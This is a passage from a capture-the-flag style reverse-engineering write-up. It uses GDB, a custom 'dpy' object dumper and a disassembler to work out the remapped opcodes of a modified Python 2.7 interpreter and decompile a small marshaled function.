</span><span class='line'>Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf -c &#39;import do_not_run_me as v; v.run_me(&quot;&quot;)&#39;
</span><span class='line'>[...]
</span></code></pre></td></tr></table></div></figure>


<p>To start, we can set two software breakpoints <em>@0x0000000000513dd0</em> and <em>@0x0000000000513dd5</em> to inspect both the marshaled string and the resulting code object.</p>

<p>Just a little reminder though on the <em>Linux/x64 ABI</em>: &ldquo;The first six integer or pointer arguments are passed in registers RDI, RSI, RDX, RCX, R8, and R9&rdquo;.</p>

<figure class='code'><figcaption><span>unmarshaled string inspection</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ p /x $rsi
</span><span class='line'>$2 = 0x91
</span><span class='line'>gdb$ x/145bx $rdi
</span><span class='line'>0x56c940 &lt;+00&gt;:  0x63    0x00    0x00    0x00    0x00    0x01    0x00    0x00
</span><span class='line'>0x56c948 &lt;+08&gt;:  0x00    0x02    0x00    0x00    0x00    0x43    0x00    0x00
</span><span class='line'>0x56c950 &lt;+16&gt;:  0x00    0x73    0x14    0x00    0x00    0x00    0x64    0x01
</span><span class='line'>0x56c958 &lt;+24&gt;:  0x00    0x87    0x00    0x00    0x7c    0x00    0x00    0x64
</span><span class='line'>0x56c960 &lt;+32&gt;:  0x01    0x00    0x3c    0x61    0x00    0x00    0x7c    0x00
</span><span class='line'>0x56c968 &lt;+40&gt;:  0x00    0x1b    0x28    0x02    0x00    0x00    0x00    0x4e
</span><span class='line'>0x56c970 &lt;+48&gt;:  0x69    0x01    0x00    0x00    0x00    0x28    0x01    0x00
</span><span class='line'>0x56c978 &lt;+56&gt;:  0x00    0x00    0x74    0x04    0x00    0x00    0x00    0x54
</span><span class='line'>0x56c980 &lt;+64&gt;:  0x72    0x75    0x65    0x28    0x01    0x00    0x00    0x00
</span><span class='line'>0x56c988 &lt;+72&gt;:  0x74    0x0e    0x00    0x00    0x00    0x52    0x6f    0x62
</span><span class='line'>0x56c990 &lt;+80&gt;:  0x65    0x72    0x74    0x5f    0x46    0x6f    0x72    0x73
</span><span class='line'>0x56c998 &lt;+88&gt;:  0x79    0x74    0x68    0x28    0x00    0x00    0x00    0x00
</span><span class='line'>0x56c9a0 &lt;+96&gt;:  0x28    0x00    0x00    0x00    0x00    0x73    0x10    0x00
</span><span class='line'>0x56c9a8 &lt;+104&gt;: 0x00    0x00    0x6f    0x62    0x66    0x75    0x73    0x63
</span><span class='line'>0x56c9b0 &lt;+112&gt;: 0x61    0x74    0x65    0x2f    0x67    0x65    0x6e    0x2e
</span><span class='line'>0x56c9b8 &lt;+120&gt;: 0x70    0x79    0x74    0x03    0x00    0x00    0x00    0x66
</span><span class='line'>0x56c9c0 &lt;+128&gt;: 0x6f    0x6f    0x05    0x00    0x00    0x00    0x73    0x06
</span><span class='line'>0x56c9c8 &lt;+136&gt;: 0x00    0x00    0x00    0x00    0x01    0x06    0x02    0x0a
</span><span class='line'>0x56c9d0 &lt;+144&gt;: 0x01
</span></code></pre></td></tr></table></div></figure>


<p>And obviously you can&rsquo;t use the Python <em>marshal</em> module to load &amp; inspect the resulting object as the author seems to have removed the methods <em>loads</em> and <em>dumps</em>:</p>

<figure class='code'><figcaption><span>fuu</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
</span><span class='line'>[GCC 4.8.2] on linux2
</span><span class='line'>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
</span><span class='line'>&gt;&gt;&gt; import marshal
</span><span class='line'>&gt;&gt;&gt; dir(marshal)
</span><span class='line'>[&#39;__doc__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;version&#39;]
</span></code></pre></td></tr></table></div></figure>


<p>We could still try to run the marshaled string in our fresh compiled original Python though:</p>

<figure class='code'><figcaption><span>unmarshal in an original Python278</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">marshal</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">part_1</span> <span class="o">=</span> <span class="n">marshal</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="s">&#39;c</span><span class="se">\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00</span><span class="s">C</span><span class="se">\x00\x00\x00</span><span class="s">s</span><span class="se">\x14\x00\x00\x00</span><span class="s">d</span><span class="se">\x01\x00\x87\x00\x00</span><span class="s">|</span><span class="se">\x00\x00</span><span class="s">d</span><span class="se">\x01\x00</span><span class="s">&lt;a</span><span class="se">\x00\x00</span><span class="s">|</span><span class="se">\x00\x00\x1b</span><span class="s">(</span><span class="se">\x02\x00\x00\x00</span><span class="s">Ni</span><span class="se">\x01\x00\x00\x00</span><span class="s">(</span><span class="se">\x01\x00\x00\x00</span><span class="s">t</span><span class="se">\x04\x00\x00\x00</span><span class="s">True(</span><span class="se">\x01\x00\x00\x00</span><span class="s">t</span><span class="se">\x0e\x00\x00\x00</span><span class="s">Robert_Forsyth(</span><span class="se">\x00\x00\x00\x00</span><span class="s">(</span><span class="se">\x00\x00\x00\x00</span><span class="s">s</span><span class="se">\x10\x00\x00\x00</span><span class="s">obfuscate/gen.pyt</span><span class="se">\x03\x00\x00\x00</span><span class="s">foo</span><span class="se">\x05\x00\x00\x00</span><span class="s">s</span><span class="se">\x06\x00\x00\x00\x00\x01\x06\x02\n\x01</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">part_1</span><span class="o">.</span><span class="n">co_code</span>
</span><span class='line'><span class="s">&#39;d</span><span class="se">\x01\x00\x87\x00\x00</span><span class="s">|</span><span class="se">\x00\x00</span><span class="s">d</span><span class="se">\x01\x00</span><span class="s">&lt;a</span><span class="se">\x00\x00</span><span class="s">|</span><span class="se">\x00\x00\x1b</span><span class="s">&#39;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">part_1</span><span class="o">.</span><span class="n">co_varnames</span>
</span><span class='line'><span class="p">(</span><span class="s">&#39;Robert_Forsyth&#39;</span><span class="p">,)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">part_1</span><span class="o">.</span><span class="n">co_names</span>
</span><span class='line'><span class="p">(</span><span class="s">&#39;True&#39;</span><span class="p">,)</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can also go further by trying to create a function out of this code object, to call it and/or to disassemble it even:</p>

<figure class='code'><figcaption><span>fuu2</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">types</span> <span class="kn">import</span> <span class="n">FunctionType</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'><span class="o">...</span>     <span class="k">pass</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">f</span> <span class="o">=</span> <span class="n">FunctionType</span><span class="p">(</span><span class="n">part_1</span><span class="p">,</span> <span class="n">a</span><span class="o">.</span><span class="n">func_globals</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">f</span><span class="p">()</span>
</span><span class='line'><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;&lt;stdin&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;obfuscate/gen.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">8</span><span class="p">,</span> <span class="ow">in</span> <span class="n">foo</span>
</span><span class='line'><span class="ne">UnboundLocalError</span><span class="p">:</span> <span class="n">local</span> <span class="n">variable</span> <span class="s">&#39;Robert_Forsyth&#39;</span> <span class="n">referenced</span> <span class="n">before</span> <span class="n">assignment</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">dis</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">dis</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>  <span class="mi">6</span>           <span class="mi">0</span> <span class="n">LOAD_CONST</span>               <span class="mi">1</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>              <span class="mi">3</span> <span class="n">LOAD_CLOSURE</span>             <span class="mi">0</span>
</span><span class='line'><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;&lt;stdin&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;/home/overclok/chall/ql-py/Python-2.7.8/Lib/dis.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">43</span><span class="p">,</span> <span class="ow">in</span> <span class="n">dis</span>
</span><span class='line'>    <span class="n">disassemble</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="n">File</span> <span class="s">&quot;/home/overclok/chall/ql-py/Python-2.7.8/Lib/dis.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">107</span><span class="p">,</span> <span class="ow">in</span> <span class="n">disassemble</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;(&#39;</span> <span class="o">+</span> <span class="n">free</span><span class="p">[</span><span class="n">oparg</span><span class="p">]</span> <span class="o">+</span> <span class="s">&#39;)&#39;</span><span class="p">,</span>
</span><span class='line'><span class="ne">IndexError</span><span class="p">:</span> <span class="nb">tuple</span> <span class="n">index</span> <span class="n">out</span> <span class="n">of</span> <span class="nb">range</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Introducing <em>dpy.py</em></h3>

<p>All right, as expected this does not work at all: seems like the custom interpreter uses different opcodes which the original virtual CPU doesn&rsquo;t know about.
Anyway, let&rsquo;s have a look at this object directly from memory because we like low level things (remember?):</p>

<figure class='code'><figcaption><span>inspecting the code object created</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ p *(PyObject*)$rax
</span><span class='line'>$3 = {ob_refcnt = 0x1, ob_type = 0x7d3da0 &lt;PyCode_Type&gt;}
</span><span class='line'>
</span><span class='line'>; Ok it is a code object, let&#39;s dump entirely the object now
</span><span class='line'>gdb$ p *(PyCodeObject*)$rax
</span><span class='line'>$4 = {
</span><span class='line'>  ob_refcnt = 0x1,
</span><span class='line'>  ob_type = 0x7d3da0 &lt;PyCode_Type&gt;,
</span><span class='line'>  co_argcount = 0x0, co_nlocals = 0x1, co_stacksize = 0x2, co_flags = 0x43,
</span><span class='line'>  co_code = 0x7ffff7f09df0,
</span><span class='line'>  co_consts = 0x7ffff7ee2908,
</span><span class='line'>  co_names = 0x7ffff7f8e390,
</span><span class='line'>  co_varnames = 0x7ffff7f09ed0,
</span><span class='line'>  co_freevars = 0x7ffff7fa7050, co_cellvars = 0x7ffff7fa7050,
</span><span class='line'>  co_filename = 0x7ffff70a9b58,
</span><span class='line'>  co_name = 0x7ffff7f102b0,
</span><span class='line'>  co_firstlineno = 0x5,
</span><span class='line'>  co_lnotab = 0x7ffff7e59900,
</span><span class='line'>  co_zombieframe = 0x0,
</span><span class='line'>  co_weakreflist = 0x0
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, and you can do that for every single field of this structure:</p>

<ul>
<li>to dump the bytecode,</li>
<li>the constants used,</li>
<li>the variable names,</li>
<li>etc.</li>
</ul>


<p>Yes, this is annoying, very much so. That is exactly why there is <em><a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a></em>, a <em>GDB</em> Python command I wrote to dump Python objects in a much easy way directly from memory:</p>

<figure class='code'><figcaption><span>show-casing dpy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ r
</span><span class='line'>Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>[...]
</span><span class='line'>&gt;&gt;&gt; a = { 1 : [1,2,3], &#39;two&#39; : 31337, 3 : (1,&#39;lul&#39;, [3,4,5])}
</span><span class='line'>&gt;&gt;&gt; print hex(id(a))
</span><span class='line'>0x7ffff7ef1050
</span><span class='line'>&gt;&gt;&gt; ^C
</span><span class='line'>Program received signal SIGINT, Interrupt.
</span><span class='line'>gdb$ dpy 0x7ffff7ef1050
</span><span class='line'>dict -&gt; {1: [1, 2, 3], 3: (1, &#39;lul&#39;, [3, 4, 5]), &#39;two&#39;: 31337}
</span></code></pre></td></tr></table></div></figure>


<h3>I need a disassembler now dad</h3>

<p>But let&rsquo;s get back to our second breakpoint now, and see what <em>dpy</em> gives us with the resulting code object:</p>

<figure class='code'><figcaption><span>dpy code object</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ dpy $rax
</span><span class='line'>code -&gt; {&#39;co_code&#39;: &#39;d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00|\x00\x00\x1b&#39;,
</span><span class='line'> &#39;co_consts&#39;: (None, 1),
</span><span class='line'> &#39;co_name&#39;: &#39;foo&#39;,
</span><span class='line'> &#39;co_names&#39;: (&#39;True&#39;,),
</span><span class='line'> &#39;co_varnames&#39;: (&#39;Robert_Forsyth&#39;,)}
</span></code></pre></td></tr></table></div></figure>


<p>Because we know the bytecode used by this interpreter is different than the original one, we have to figure out the equivalent between the instructions and their opcodes:</p>

<ol>
<li>Either we can reverse-engineer each handler of the virtual CPU,</li>
<li>Either we can create functions in both interpreters, disassemble those (thanks to <em>dpy</em>) and match the equivalent opcodes</li>
</ol>


<p>I guess we can mix both of them to be more efficient:</p>

<figure class='code'><figcaption><span>deducing equivalent opcodes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Python 2.7.8 (default, Sep  5 2014, 00:13:07)
</span><span class='line'>[GCC 4.8.2] on linux2
</span><span class='line'>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
</span><span class='line'>&gt;&gt;&gt; def assi(x):
</span><span class='line'>...     x = &#39;hu&#39;
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; def add(x):
</span><span class='line'>...     return x + 31337
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; import dis
</span><span class='line'>&gt;&gt;&gt; dis.dis(assi)
</span><span class='line'>  2           0 LOAD_CONST               1 (&#39;hu&#39;)
</span><span class='line'>              3 STORE_FAST               0 (x)
</span><span class='line'>              6 LOAD_CONST               0 (None)
</span><span class='line'>              9 RETURN_VALUE
</span><span class='line'>&gt;&gt;&gt; dis.dis(add)
</span><span class='line'>  2           0 LOAD_FAST                0 (x)
</span><span class='line'>              3 LOAD_CONST               1 (31337)
</span><span class='line'>              6 BINARY_ADD
</span><span class='line'>              7 RETURN_VALUE
</span><span class='line'>&gt;&gt;&gt; assi.func_code.co_code
</span><span class='line'>&#39;d\x01\x00}\x00\x00d\x00\x00S&#39;
</span><span class='line'>&gt;&gt;&gt; add.func_code.co_code
</span><span class='line'>&#39;|\x00\x00d\x01\x00\x17S&#39;
</span><span class='line'>
</span><span class='line'># In the custom interpreter
</span><span class='line'>
</span><span class='line'>gdb$ r
</span><span class='line'>Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
</span><span class='line'>Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
</span><span class='line'>[GCC 4.8.2] on linux2
</span><span class='line'>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
</span><span class='line'>&gt;&gt;&gt; def assi(x):
</span><span class='line'>...     x = &#39;hu&#39;
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; def add(x):
</span><span class='line'>...     return x + 31337
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; print hex(id(assi))
</span><span class='line'>0x7ffff7f0c578
</span><span class='line'>&gt;&gt;&gt; print hex(id(add))
</span><span class='line'>0x7ffff7f0c5f0
</span><span class='line'>&gt;&gt;&gt; ^C
</span><span class='line'>Program received signal SIGINT, Interrupt.
</span><span class='line'>gdb$ dpy 0x7ffff7f0c578
</span><span class='line'>function -&gt; {&#39;func_code&#39;: {&#39;co_code&#39;: &#39;d\x01\x00\x87\x00\x00d\x00\x00\x1b&#39;,
</span><span class='line'>               &#39;co_consts&#39;: (None, &#39;hu&#39;),
</span><span class='line'>               &#39;co_name&#39;: &#39;assi&#39;,
</span><span class='line'>               &#39;co_names&#39;: (),
</span><span class='line'>               &#39;co_varnames&#39;: (&#39;x&#39;,)},
</span><span class='line'> &#39;func_dict&#39;: None,
</span><span class='line'> &#39;func_doc&#39;: None,
</span><span class='line'> &#39;func_module&#39;: &#39;__main__&#39;,
</span><span class='line'> &#39;func_name&#39;: &#39;assi&#39;}
</span><span class='line'>gdb$ dpy 0x7ffff7f0c5f0
</span><span class='line'>function -&gt; {&#39;func_code&#39;: {&#39;co_code&#39;: &#39;\x8f\x00\x00d\x01\x00=\x1b&#39;,
</span><span class='line'>               &#39;co_consts&#39;: (None, 31337),
</span><span class='line'>               &#39;co_name&#39;: &#39;add&#39;,
</span><span class='line'>               &#39;co_names&#39;: (),
</span><span class='line'>               &#39;co_varnames&#39;: (&#39;x&#39;,)},
</span><span class='line'> &#39;func_dict&#39;: None,
</span><span class='line'> &#39;func_doc&#39;: None,
</span><span class='line'> &#39;func_module&#39;: &#39;__main__&#39;,
</span><span class='line'> &#39;func_name&#39;: &#39;add&#39;}
</span><span class='line'>
</span><span class='line'> # From here we have:
</span><span class='line'> # 0x64 -&gt; LOAD_CONST
</span><span class='line'> # 0x87 -&gt; STORE_FAST
</span><span class='line'> # 0x1b -&gt; RETURN_VALUE
</span><span class='line'> # 0x8f -&gt; LOAD_FAST
</span><span class='line'> # 0x3d -&gt; BINARY_ADD
</span></code></pre></td></tr></table></div></figure>


<p>OK I think you got the idea, and if you don&rsquo;t manage to find all of them you can just debug the virtual CPU by putting a software breakpoint <em>@0x4b0960</em>:</p>

<figure class='code'><figcaption><span>opcode fetching</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>=&gt; 0x4b0923 &lt;PyEval_EvalFrameEx+867&gt;:   movzx  eax,BYTE PTR [r13+0x0]
</span></code></pre></td></tr></table></div></figure>


<p>For the interested readers: there is at least one interesting opcode that you wouldn&rsquo;t find in a normal Python interpreter, check what <em>0xA0</em> is doing especially when followed by <em>0x87</em> :&ndash;).</p>

<h3>Back to the first marshaled function with all our tooling now</h3>

<p>Thanks to our <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/disassembler_ql_chall.py">disassembler.py</a>, we can now disassemble easily the first part:</p>

<figure class='code'><figcaption><span>disassembling</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\Codes\ql-chall-python-2014&gt; python .\disassembler_ql_chall.py
</span><span class='line'>  6           0 LOAD_CONST               1 (1)
</span><span class='line'>              3 STORE_FAST               0 (Robert_Forsyth)
</span><span class='line'>
</span><span class='line'>  8           6 LOAD_GLOBAL              0 (True)
</span><span class='line'>              9 LOAD_CONST               1 (1)
</span><span class='line'>             12 INPLACE_ADD
</span><span class='line'>             13 STORE_GLOBAL             0 (True)
</span><span class='line'>
</span><span class='line'>  9          16 LOAD_GLOBAL              0 (True)
</span><span class='line'>             19 RETURN_VALUE
</span><span class='line'>================================================================================
</span></code></pre></td></tr></table></div></figure>


<p>It seems the author has been really (too) kind with us: the function is really small and we can rewrite it in Python straightaway:</p>

<figure class='code'><figcaption><span>part_1</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">part1</span><span class="p">():</span>
</span><span class='line'>    <span class="k">global</span> <span class="bp">True</span>
</span><span class='line'>    <span class="n">Robert_Forsyth</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="bp">True</span> <span class="o">+=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can also make sure with <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a> that the code of <em>part1</em> is the exact same than the unmarshaled function we dumped earlier.</p>

<figure class='code'><figcaption><span>part_1 successfully decompiled</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>&gt;&gt;&gt; def part_1():
</span><span class='line'>...  global True
</span><span class='line'>...  Robert_Forsyth = 1
</span><span class='line'>...  True += 1
</span><span class='line'>...
</span><span class='line'>&gt;&gt;&gt; print hex(id(part_1))
</span><span class='line'>0x7ffff7f0f578
</span><span class='line'>&gt;&gt;&gt; ^C
</span><span class='line'>Program received signal SIGINT, Interrupt.
</span><span class='line'>gdb$ dpy 0x7ffff7f0f578
</span><span class='line'>function -&gt; {&#39;func_code&#39;: {&#39;co_code&#39;: &#39;d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00d\x00\x00\x1b&#39;,
</span><span class='line'>               &#39;co_consts&#39;: (None, 1),
</span><span class='line'>               &#39;co_name&#39;: &#39;part_1&#39;,
</span><span class='line'>               &#39;co_names&#39;: (&#39;True&#39;,),
</span><span class='line'>               &#39;co_varnames&#39;: (&#39;Robert_Forsyth&#39;,)},
</span><span class='line'> &#39;func_dict&#39;: None,
</span><span class='line'> &#39;func_doc&#39;: None,
</span><span class='line'> &#39;func_module&#39;: &#39;__main__&#39;,
</span><span class='line'> &#39;func_name&#39;: &#39;part_1&#39;}
</span></code></pre></td></tr></table></div></figure>


<h3>Run my bytecode</h3>

<p>The second part is also quite simple according to the following disassembly:</p>

<figure class='code'><figcaption><span>run my bytecode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
